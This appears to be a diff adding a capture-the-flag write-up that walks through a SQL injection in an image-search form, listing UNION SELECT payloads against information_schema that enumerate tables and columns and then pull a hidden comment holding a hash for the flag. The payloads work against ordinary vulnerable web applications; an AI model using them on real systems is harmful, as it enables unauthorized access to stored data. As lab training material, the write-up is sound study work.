@@ -1,0 +1,28 @@
+Test if vulnerable to SQL Injection
+1 OR 1=1
+
+We get all the results because every row is considered true.
+
+Get the table names in the database
+1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.TABLES
+
+Here we find:
+
+Title: list_images
+Url : Member_images
+Find table columns in the database for each table
+1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS
+
+Here find the following table structure:
+
+Table name: list_images, column : id
+Table name: list_images, column : url
+Table name: list_images, column : title
+Table name: list_images, column : comment
+Look at the comment below each member's image
+1 OR 1=1 UNION SELECT title, comment FROM Member_images.list_images
+
+Here we find:
+
+Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+Url : Hack me ?
